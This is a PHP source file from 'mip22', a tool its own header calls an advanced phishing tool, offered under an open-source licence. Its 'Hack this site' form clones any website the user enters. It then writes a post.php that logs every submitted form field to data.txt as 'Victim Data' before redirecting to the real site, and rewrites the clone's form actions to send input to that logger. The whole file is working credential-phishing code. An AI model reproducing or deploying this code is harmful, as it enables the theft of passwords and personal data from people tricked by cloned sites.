<?php

/*
*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
*  mip22 is a advanced phishing tool.
*
*  mip22 is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  mip22 is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

?>


<html>
<head>

   <title> Mip22 </title>
  
  <link rel="icon" type="image/jpg" href="/css/icons/logo.png" />

 
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />

<meta name="viewport" content="width=device-width, initial-scale=1.0">


<style>

body
{
background-image: url("img/back2.jpeg");
background-repeat: no-repeat;
background-size: auto;
}


#site
{
height:3em;
width: 25em;
margin: 0 auto;
border: 1px solid black;
border-radius: 10px;
font-size: 15px;
text-align:center;
}


#butt
{
height:2.5em;
width: 25em;
background-color: e74f5b;
color: white;
margin: 0 auto;
border: 1px solid black;
border-radius: 10px;
font-size: 15px;
}



#butt:hover
{
height:2.5em;
width: 25em;
background-color: red;
color: white;
margin: 0 auto;
border: 1px solid black;
border-radius: 10px;
}

@import url('https://fonts.googleapis.com/css?family=Suez+One');
#text{
    font-family: "Suez One", serif;
    font-weight: bold;
    text-align: center;
    font-size: 35px;
    color: rgb(255, 0, 34);
    background-color: rgba(0, 0, 0, 0);
    text-shadow: rgb(0, 0, 0) 2px 2px 2px;
}

</style>

	

</head>


<body>



<div align="center">
  
      <br>
		
	  <font size="7"> 
		<span id="text"> Mip22 <br> Missions Impossibles </span>
		 </font>   
		     
               <br>
         
         <img src="img/logo.png" height="250px" width="250px"
              style="background-color:transparent;">
       

	 
	  
 <form action="" method="post" >
	 
 
 <input type="text" name="site_hack" minlength="7" maxlength="256" placeholder="Enter a web site ec: http(s)://www.website.com"  
   id="site" required>  
      <br> 
     <br>
   <input type="submit" name="hack" value="Hack this site" id="butt"> 
  </form>



</div>


</body>



</html>



<?php


  require_once('__SRC__/class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
    {
    $obj_data = new INPUT_DATA_AVAILABLE;
      



  if(isset($_POST['hack']))
      {
      $site_hack = $obj_data-> SAFE_DATA_ENTER($_POST['site_hack']);
 

     $site_name = "index"; 

     $url    = $site_hack;
     $name   = $site_name.'.html';
     $file   = file($url);
     $result = file_put_contents($name, $file);


     chmod("index.html", 0777);


    $post_data_txt = fopen("data.txt", "w") or die("Unable to open file!");
    $lines_data_txt = PHP_EOL;
    fwrite($post_data_txt, $lines_data_txt);
    fclose($post_data_txt);

 
     chmod("data.txt", 0777);




    $post_file_php = fopen("post.php", "w") or die("Unable to open file!");
    $lines_php = '<?php $file = "data.txt";' .PHP_EOL
      .'file_put_contents($file, print_r('."'$site_hack Victim Data \n'".', true), FILE_APPEND);' .PHP_EOL
      .'file_put_contents($file, print_r($_POST, true), FILE_APPEND);' .PHP_EOL
      . 'file_put_contents($file, print_r("Array_end\n\n", true), FILE_APPEND);' .PHP_EOL
      .'?>'
      .PHP_EOL
      ."<meta http-equiv='refresh' content='0; url=$site_hack'/>";

    fwrite($post_file_php, $lines_php);
    fclose($post_file_php);

     

      chmod("post.php", 0777);



  $path_to_file = 'index.html';
  $file_contents = file_get_contents($path_to_file);
  $file_contents = str_replace('action="','action="post.php" " ',$file_contents);
  file_put_contents($path_to_file,$file_contents);
   
   
   echo "<div align='center'> 
            <br>
          <font size='4' color='red' style='background-color:white;'> 
           The website $site_hack hack successfully </font> 
            <br>
          <font size='4' color='red' style='background-color:white;'> 
          Return to terminal and continue the attack. </font>  
         </div>"; 
   
   
  #echo '<script type="text/javascript">alert("The website hack successfully");
     #    </script>';
     #echo ("<script>location.href='http://127.0.0.1:8080'</script>");


 } // end of isset



  } // end of if exists class tools


?>
